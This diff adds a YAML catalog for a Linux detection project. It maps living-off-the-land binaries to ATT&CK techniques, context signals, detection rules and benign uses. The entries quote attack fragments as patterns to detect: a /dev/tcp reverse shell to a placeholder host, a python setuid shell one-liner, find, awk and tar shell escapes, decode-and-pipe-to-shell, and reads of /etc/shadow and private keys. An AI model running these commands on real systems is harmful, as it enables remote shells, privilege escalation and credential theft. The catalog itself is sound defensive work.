@@ -1,0 +1,427 @@
+# ROMULUS research: Linux living-off-the-land catalog, round 1 (2026-10-19).
+# Spec §7 item 7. Corpus: GTFOBins function classes (shell, reverse/bind shell, file upload/download/read/write,
+# SUID, sudo, capabilities, library load) and the CISA joint guidance on identifying living-off-the-land
+# techniques, used as research reference only (reimplemented, not copied; licenses recorded in docs/research/README.md).
+# The binary is legitimate, so no entry detects on the binary's presence. Every pattern rests on context:
+# parent/lineage, account, token-aware arguments, the file or network effect that followed, rarity against the
+# host's and peers' baseline, time, and the chain it sits in. Argument-based patterns are positive-only (ADR-004);
+# patterns that rest on kernel exe paths, PATH records or typed network fields can assure negatives.
+# Wording rule: "X was run with arguments that request Y" is not "X did Y" unless a file/network/process event shows Y.
+schema_version: 1
+context_signals:
+  lineage: parent and ancestor exe paths (kernel-recorded) and whether they are a service, web server, cron, login shell
+  account: uid/euid/auid, service vs human account, account role
+  args: token-aware argv (flag prefixes, grouped short flags, quoting); positive-only
+  effect: the file write (PATH), connection (auditd_net/EVE), or child process that followed
+  rarity: binary+argument-shape prevalence on this host, across peers, and in the frozen baseline
+  time: hour of day relative to the account's baseline and maintenance windows
+  chain: preceding and following stages (download -> exec, discovery -> privesc, archive -> upload)
+binaries:
+  - id: lotl.unix_shells
+    binaries: [bash, sh, dash, zsh, ksh, busybox sh]
+    patterns:
+      - pattern: Reverse shell via /dev/tcp or /dev/udp redirection (bash -i >& /dev/tcp/H/P 0>&1)
+        techniques: [T1059.004, T1095]
+        signals: [lineage, effect, args]
+        detection: "BL-02 (connected parent or shell owning the socket), argv shape positive-only, COR-19"
+        disposition: "planned | BL-02; /dev/tcp is a shell builtin path, so no connect() exe other than the shell itself"
+      - pattern: Shell spawned by a web server, database, mail, print or other network service account
+        techniques: [T1059.004, T1505.003, T1190]
+        signals: [lineage, account]
+        detection: "host.web_service_spawns_interpreter (web case); T1059 lineage idea for other services"
+        disposition: "covered | web-service case covered (positive-only)"
+      - pattern: sh -c with a downloader piped into an interpreter, or base64 -d | sh
+        techniques: [T1105, T1140, T1027.010]
+        signals: [args, chain]
+        detection: "host.download_piped_to_shell, host.downloader_feeds_interpreter"
+        disposition: "covered | positive-only"
+    benign: [login shells, scripts, cron jobs, package maintainer scripts]
+  - id: lotl.python
+    binaries: [python, python2, python3, pythonX.Y]
+    patterns:
+      - pattern: python -c with socket+subprocess/pty (reverse shell) or pty.spawn (TTY upgrade)
+        techniques: [T1059.006, T1095]
+        signals: [args, effect, lineage]
+        detection: "host.python_pty_spawn (positive-only), BL-01, BL-02"
+        disposition: "covered | PTY upgrade covered; socket-based reverse shell planned (BL-01/BL-02)"
+      - pattern: python -m http.server / SimpleHTTPServer / uploadserver on a server (ad-hoc file serving)
+        techniques: [T1105, T1570, T1048.003]
+        signals: [args, effect, account]
+        detection: "COR-18 new listener + inbound GETs; argv positive-only"
+        disposition: "planned | needs auditd_net bind/accept"
+      - pattern: python -c "import os; os.setuid(0); os.system('/bin/sh')" on a binary with cap_setuid or via sudo
+        techniques: [T1548.001, T1548.003]
+        signals: [account, lineage]
+        detection: "BL-06 unbrokered root process"
+        disposition: "planned | BL-06"
+    benign: [application runtimes, automation, configuration management]
+  - id: lotl.perl_ruby_php_lua_node
+    binaries: [perl, ruby, php, php-cli, lua, luajit, node, nodejs]
+    patterns:
+      - pattern: -e/-r one-liners opening sockets and exec'ing a shell
+        techniques: [T1059.004, T1059.006, T1059.007, T1059.011]
+        signals: [args, effect, lineage]
+        detection: "BL-01, BL-02"
+        disposition: "planned | BL-01/BL-02"
+      - pattern: Interpreter run by the web-service account outside the application's normal entry point
+        techniques: [T1505.003]
+        signals: [lineage, account, rarity]
+        detection: "host.web_service_spawns_interpreter"
+        disposition: "covered | positive-only"
+    benign: [web applications (php-fpm workers are not spawned by apache via exec), build tools]
+  - id: lotl.awk
+    binaries: [awk, gawk, mawk, busybox awk]
+    patterns:
+      - pattern: BEGIN { system("/bin/sh") } shell escape or gawk /inet/tcp reverse shell
+        techniques: [T1059.004, T1095]
+        signals: [args, lineage, effect]
+        detection: "BL-02 (gawk owns the socket); argv positive-only"
+        disposition: "planned | BL-02"
+    benign: [text processing in scripts]
+  - id: lotl.curl_wget
+    binaries: [curl, wget, busybox wget]
+    patterns:
+      - pattern: Download into a temp/web directory then chmod +x and run, or pipe into an interpreter
+        techniques: [T1105, T1204.002]
+        signals: [args, chain, account]
+        detection: "host.downloader_feeds_interpreter, host.download_piped_to_shell, BL-22"
+        disposition: "covered | piped forms covered; download-then-exec planned"
+      - pattern: Upload of files (-T, -F, --data-binary @file, --upload-file, wget --post-file)
+        techniques: [T1048.002, T1048.003, T1567]
+        signals: [args, effect]
+        detection: "COR-12, BL-15"
+        disposition: "planned | BL-15"
+      - pattern: Requests to cloud metadata endpoints (169.254.169.254, metadata.google.internal) from non-agent processes
+        techniques: [T1552.005, T1580]
+        signals: [lineage, account, effect]
+        detection: "BL-01 with destination 169.254.169.254 by a web-service or interactive process"
+        disposition: "planned | BL-01 (cloud-hosted Linux hosts)"
+      - pattern: Connectivity and IP-echo checks (curl ifconfig.me) from servers
+        techniques: [T1016.001]
+        signals: [rarity, chain]
+        detection: "T1016.001 entry"
+        disposition: "planned | indicator list"
+    benign: [package managers, health checks, API clients, installers]
+  - id: lotl.ssh_client
+    binaries: [ssh, scp, sftp, rsync, sshpass]
+    patterns:
+      - pattern: Port forwarding and dynamic SOCKS (-R, -L, -D, -w; grouped like -fNR), ProxyCommand/ProxyJump
+        techniques: [T1572, T1090.001]
+        signals: [args, effect, account]
+        detection: "COR-11"
+        disposition: "planned | COR-11"
+      - pattern: Outbound SSH from a server-role host or a web-service account; key just read from another user
+        techniques: [T1021.004, T1552.004, T1563.001]
+        signals: [account, lineage, chain]
+        detection: "COR-14, BL-14"
+        disposition: "planned | COR-14"
+      - pattern: scp/rsync of archives to external hosts
+        techniques: [T1048.001]
+        signals: [args, effect, chain]
+        detection: "COR-12"
+        disposition: "planned | COR-12"
+      - pattern: sshpass -p in argv (password on the command line)
+        techniques: [T1078, T1552.001]
+        signals: [args]
+        detection: "positive-only lead; cite the token, never the value (secrets rule)"
+        disposition: "deferred | lead only; the value must be redacted in any finding"
+    benign: [administration, deployment, backups]
+  - id: lotl.openssl
+    binaries: [openssl]
+    patterns:
+      - pattern: s_client as a transport for a reverse shell (mkfifo + openssl s_client -connect)
+        techniques: [T1573.002, T1059.004]
+        signals: [lineage, effect]
+        detection: "BL-02 (openssl owns the socket feeding a shell)"
+        disposition: "planned | BL-02"
+      - pattern: enc -d / base64 -d decoding a payload then executing it; enc -e before upload
+        techniques: [T1140, T1027.013, T1560.003]
+        signals: [chain, args]
+        detection: "T1140 decode-then-exec sequence"
+        disposition: "planned | T1140"
+    benign: [certificate management, TLS testing]
+  - id: lotl.encoders
+    binaries: [base64, base32, xxd, od, uudecode, gzip, zcat]
+    patterns:
+      - pattern: Decode into a file that is executed, or into an interpreter's stdin
+        techniques: [T1140, T1027.010]
+        signals: [chain]
+        detection: "host.download_piped_to_shell (pipe case), T1140"
+        disposition: "covered | piped-to-shell case covered (positive-only)"
+    benign: [scripts, data handling]
+  - id: lotl.find_xargs
+    binaries: [find, xargs]
+    patterns:
+      - pattern: find -exec /bin/sh (sudo or SUID escape)
+        techniques: [T1548.003, T1548.001]
+        signals: [lineage, account]
+        detection: "BL-06; T1548.003 sudo-escape lineage"
+        disposition: "planned | BL-06"
+      - pattern: find / -perm -4000 / -writable / -name id_rsa / -name '*.conf' (discovery and credential hunting)
+        techniques: [T1083, T1552.001, T1552.004]
+        signals: [args, chain, account]
+        detection: "BL-05 member; T1552.001"
+        disposition: "planned | BL-05"
+    benign: [admin maintenance, backups, updatedb]
+  - id: lotl.archivers
+    binaries: [tar, zip, unzip, 7z, gzip, bzip2, xz]
+    patterns:
+      - pattern: Archive of /etc, /home, /root, web roots or DB dirs into temp/web dirs, optionally encrypted
+        techniques: [T1560.001, T1074.001]
+        signals: [args, effect, chain, account]
+        detection: "T1560.001, COR-12"
+        disposition: "planned | T1560.001"
+      - pattern: tar --checkpoint-action=exec / zip -TT shell escapes (sudo or wildcard injection)
+        techniques: [T1548.003, T1059.004]
+        signals: [lineage, account]
+        detection: "BL-06; shell child of tar/zip"
+        disposition: "planned | BL-06"
+    benign: [backups, deployments, log rotation]
+  - id: lotl.editors_pagers
+    binaries: [vi, vim, nano, ed, less, more, man, view]
+    patterns:
+      - pattern: Shell escape (:!sh, !sh) from an editor or pager running under sudo or SUID
+        techniques: [T1548.003, T1059.004]
+        signals: [lineage, account]
+        detection: "T1548.003 idea: root shell whose parent is an editor/pager started by sudo"
+        disposition: "planned | lineage rule"
+      - pattern: Editor modifying persistence files (crontab via vi, unit files, authorized_keys)
+        techniques: [T1053.003, T1543.002, T1098.004]
+        signals: [effect]
+        detection: "BL-17 (kernel PATH write; editor identity irrelevant)"
+        disposition: "planned | BL-17"
+    benign: [administration]
+  - id: lotl.exec_wrappers
+    binaries: [env, nice, timeout, stdbuf, setarch, taskset, flock, time, ionice, rlwrap]
+    patterns:
+      - pattern: Wrapper used to launch a shell (env /bin/sh) under sudo/SUID, or to obscure argv[0] position
+        techniques: [T1548.003, T1036]
+        signals: [lineage]
+        detection: "BL-06; lineage rules must look through wrappers to the real child"
+        disposition: "planned | rule-engine requirement: wrapper transparency in lineage"
+    benign: [scripts]
+  - id: lotl.detachers
+    binaries: [nohup, setsid, disown (builtin), screen, tmux, daemon, start-stop-daemon]
+    patterns:
+      - pattern: Detach a network-connecting process from the session (survives logout; reparented to init)
+        techniques: [T1564.011, T1036.009]
+        signals: [lineage, account, effect]
+        detection: "T1036.009 ppid=1 with auid set; BL-01"
+        disposition: "planned | T1036.009"
+    benign: [long-running admin jobs]
+  - id: lotl.schedulers
+    binaries: [crontab, at, batch, systemd-run, systemctl]
+    patterns:
+      - pattern: New cron/at/systemd timer entry running a downloader, interpreter, or temp-path binary
+        techniques: [T1053.003, T1053.002, T1053.006, T1543.002, T1569.003]
+        signals: [effect, chain, account]
+        detection: "BL-17, COR-15, host.downloader_feeds_interpreter"
+        disposition: "covered | downloader-from-cron covered; file-write detection planned"
+      - pattern: systemctl stop/disable/mask of auditd, rsyslog, journald, firewall or EDR units
+        techniques: [T1685, T1686]
+        signals: [args, account, effect]
+        detection: "BL-19"
+        disposition: "planned | BL-19"
+    benign: [administration, package installs]
+  - id: lotl.account_tools
+    binaries: [useradd, adduser, usermod, passwd, chpasswd, gpasswd, groupadd, chage, userdel, vipw]
+    patterns:
+      - pattern: Account created, UID 0 assigned, privileged group added, password set non-interactively
+        techniques: [T1136.001, T1098.007, T1531]
+        signals: [account, effect, time]
+        detection: "BL-18, COR-26"
+        disposition: "planned | BL-18"
+    benign: [provisioning, admin work]
+  - id: lotl.permission_tools
+    binaries: [chmod, chown, chattr, setfacl, setcap, getcap]
+    patterns:
+      - pattern: chmod u+s / setcap cap_setuid+ep on files outside system paths
+        techniques: [T1548.001, T1222.002]
+        signals: [args, effect]
+        detection: "T1548.001, T1222.002"
+        disposition: "planned | syscall audit improves to negative-capable"
+      - pattern: chattr +i/+a to lock persistence or logs; chattr -i before tampering
+        techniques: [T1564.014, T1222.002]
+        signals: [args, chain]
+        detection: "T1564.014"
+        disposition: "planned | positive-only"
+    benign: [deployments, hardening]
+  - id: lotl.privilege_brokers
+    binaries: [sudo, sudoedit, su, pkexec, doas]
+    patterns:
+      - pattern: sudo -l enumeration, repeated sudo failures, first sudo by an account, sudo by a web-service account
+        techniques: [T1548.003, T1069.001]
+        signals: [account, rarity]
+        detection: "T1548.003 entry over journal_sudo (normalized)"
+        disposition: "planned | journal_sudo ready"
+      - pattern: pkexec invoked with an empty argv (PwnKit) or by an unusual parent
+        techniques: [T1068]
+        signals: [args, lineage]
+        detection: "tool.local_exploits lead; BL-06"
+        disposition: "planned | BL-06"
+    benign: [administration]
+  - id: lotl.namespaces_containers
+    binaries: [docker, podman, ctr, crictl, kubectl, nsenter, unshare, chroot, mount, losetup]
+    patterns:
+      - pattern: docker run -v /:/host or --privileged by a non-admin; nsenter -t 1; mount of host block devices
+        techniques: [T1611, T1610, T1609]
+        signals: [args, account]
+        detection: "T1611 entry"
+        disposition: "needs_telemetry | container hosts not in lab"
+      - pattern: Membership in docker/lxd group used to obtain root
+        techniques: [T1548, T1098.007]
+        signals: [account, chain]
+        detection: "BL-18 (group add), BL-06 (root process via docker parent)"
+        disposition: "planned | BL-18/BL-06"
+      - pattern: mount --bind over /proc/<pid> to hide a process
+        techniques: [T1564.013]
+        signals: [args]
+        detection: "T1564.013"
+        disposition: "planned | positive-only"
+    benign: [container operations]
+  - id: lotl.kernel_modules
+    binaries: [insmod, modprobe, rmmod, kmod, dkms]
+    patterns:
+      - pattern: Module loaded after boot from a non-standard path or by an interactive session
+        techniques: [T1547.006, T1014]
+        signals: [args, lineage, time]
+        detection: "BL-21"
+        disposition: "planned | BL-21"
+    benign: [DKMS rebuilds, driver installs]
+  - id: lotl.firewall_tools
+    binaries: [iptables, ip6tables, nft, ufw, firewall-cmd]
+    patterns:
+      - pattern: Rules blocking or allowing specific addresses; flush; disabling the firewall
+        techniques: [T1686]
+        signals: [args, effect, account]
+        detection: "host.firewall_rule_change_command, COR-25"
+        disposition: "covered | address-specific block/unblock covered (positive-only); flush/disable planned"
+    benign: [administration, fail2ban (by its exe lineage)]
+  - id: lotl.log_tools
+    binaries: [journalctl, auditctl, augenrules, logger, logrotate, truncate, shred, rm]
+    patterns:
+      - pattern: journalctl --vacuum/--rotate, auditctl -D/-e 0/-a never, truncation or deletion of /var/log files
+        techniques: [T1685.004, T1685.006, T1070.003, T1564.012]
+        signals: [args, effect, account]
+        detection: "BL-19"
+        disposition: "planned | BL-19"
+      - pattern: logger injecting fake entries
+        techniques: [T1685.003]
+        signals: [lineage, account]
+        detection: "deferred: positive-only lead when run by web-service or newly created accounts"
+        disposition: "deferred | low value"
+    benign: [maintenance, logrotate (exe allow-list by lineage)]
+  - id: lotl.timestomp
+    binaries: [touch]
+    patterns:
+      - pattern: touch -r/-d/-t on files in system, web or persistence paths
+        techniques: [T1070.006]
+        signals: [args, chain]
+        detection: "T1070.006"
+        disposition: "planned | positive-only"
+    benign: [build systems, packaging]
+  - id: lotl.disk_tools
+    binaries: [dd, wipefs, sgdisk, parted, fdisk, shred, debugfs]
+    patterns:
+      - pattern: Raw device reads (credential/data access bypassing permissions) or writes (wiping)
+        techniques: [T1006, T1561.001, T1561.002, T1485]
+        signals: [args, account, time]
+        detection: "T1006, T1561 entries"
+        disposition: "planned | PATH open on /dev/sd* makes it negative-capable"
+    benign: [imaging, provisioning]
+  - id: lotl.debuggers
+    binaries: [gdb, strace, ltrace, perf]
+    patterns:
+      - pattern: Attach (-p) to sshd, sudo, login, a shell of another user, or a credential-holding daemon
+        techniques: [T1055.008, T1056.001, T1003.007]
+        signals: [args, account, lineage]
+        detection: "T1055.008"
+        disposition: "planned | syscall audit for negatives"
+      - pattern: gdb -batch -ex 'call system(...)' or python inside gdb to escape sudo/SUID
+        techniques: [T1548.003]
+        signals: [lineage]
+        detection: "BL-06"
+        disposition: "planned | BL-06"
+    benign: [development, troubleshooting]
+  - id: lotl.dynamic_linker
+    binaries: [ld.so, ldconfig, ldd]
+    patterns:
+      - pattern: /etc/ld.so.preload write; ld.so.conf.d entry pointing to a writable directory; ld.so invoked directly to run a noexec-mounted binary
+        techniques: [T1574.006, T1014]
+        signals: [effect, args]
+        detection: "BL-21; exec where process.executable is the dynamic loader and argv[1] is a binary in /tmp or /dev/shm"
+        disposition: "planned | BL-21"
+    benign: [package installs]
+  - id: lotl.package_managers
+    binaries: [apt, apt-get, dpkg, yum, dnf, rpm, pip, pip3, npm, gem, cargo, go]
+    patterns:
+      - pattern: Install of a local package file or a package from a non-standard index; maintainer/install scripts spawning shells or sockets
+        techniques: [T1546.016, T1195.001, T1204.005]
+        signals: [lineage, effect, chain]
+        detection: "T1546.016, T1195.001"
+        disposition: "planned | lineage + BL-01"
+      - pattern: sudo apt/yum/pip with plugin or option hooks to run a shell (GTFOBins sudo)
+        techniques: [T1548.003]
+        signals: [lineage]
+        detection: "BL-06 / sudo-escape lineage"
+        disposition: "planned | lineage rule"
+    benign: [patching]
+  - id: lotl.git
+    binaries: [git]
+    patterns:
+      - pattern: git hooks or core.pager/sshCommand config executing commands; git push of local data to external remotes
+        techniques: [T1546, T1567.001]
+        signals: [lineage, effect]
+        detection: "T1567.001; shell children of git on servers"
+        disposition: "planned | lineage"
+    benign: [development, deployment]
+  - id: lotl.dns_tools
+    binaries: [dig, nslookup, host, drill, resolvectl]
+    patterns:
+      - pattern: Loops of queries with encoded labels (DNS exfil), AXFR requests, PTR sweeps
+        techniques: [T1048.003, T1590.002, T1018]
+        signals: [args, effect, rarity]
+        detection: "BL-10, BL-11, COR-16"
+        disposition: "planned | BL-10/BL-11"
+    benign: [troubleshooting]
+  - id: lotl.icmp_tools
+    binaries: [ping, hping3, nping, fping]
+    patterns:
+      - pattern: ping sweeps; ping -p patterned payloads (data in ICMP); hping3 crafted floods
+        techniques: [T1018, T1048.003, T1498.001]
+        signals: [args, effect]
+        detection: "BL-09 ICMP sweep, BL-12 ICMP payload feature"
+        disposition: "planned | BL-09/BL-12"
+    benign: [monitoring, troubleshooting]
+  - id: lotl.legacy_transfer
+    binaries: [telnet, ftp, tftp, nc (see tools.yaml), mkfifo, mknod]
+    patterns:
+      - pattern: mkfifo/mknod pipe wired to a shell and a network client (classic reverse shell without -e)
+        techniques: [T1059.004, T1095]
+        signals: [lineage, effect, chain]
+        detection: "BL-02 (sibling shell and network client under one parent, joined by the fifo path when PATH is normalized)"
+        disposition: "planned | BL-02"
+      - pattern: tftp/ftp transfers to or from network devices or external hosts
+        techniques: [T1105, T1048.003, T1542.005]
+        signals: [effect, account]
+        detection: "T1071.002, T1542.005"
+        disposition: "planned | network side"
+    benign: [legacy device management]
+  - id: lotl.discovery_set
+    binaries: [id, whoami, w, who, last, uname, hostname, hostnamectl, ip, ifconfig, route, arp, ss, netstat, lsof, ps, top, getent, cat /etc/passwd, sudo -l, crontab -l, systemctl list-units, df, lsblk, lsmod, dpkg -l, rpm -qa]
+    patterns:
+      - pattern: Several categories run from one session within minutes, especially from a web-service shell or right after login
+        techniques: [T1033, T1082, T1016, T1049, T1057, T1087.001, T1069.001, T1007, T1518, T1652, T1680]
+        signals: [chain, lineage, account, rarity]
+        detection: "BL-05"
+        disposition: "planned | BL-05"
+    benign: [admins, configuration management fact gathering, monitoring agents]
+  - id: lotl.credential_readers
+    binaries: [cat, head, tail, less, grep, strings, cp, base64]
+    patterns:
+      - pattern: Reading /etc/shadow, private keys, history files of other users, application configs with secrets
+        techniques: [T1003.008, T1552.001, T1552.003, T1552.004]
+        signals: [args, account, effect]
+        detection: "host.credential_store_read (shadow), T1552.x"
+        disposition: "covered | shadow reads covered (positive-only); kernel PATH watches planned"
+    benign: [administration, backups]
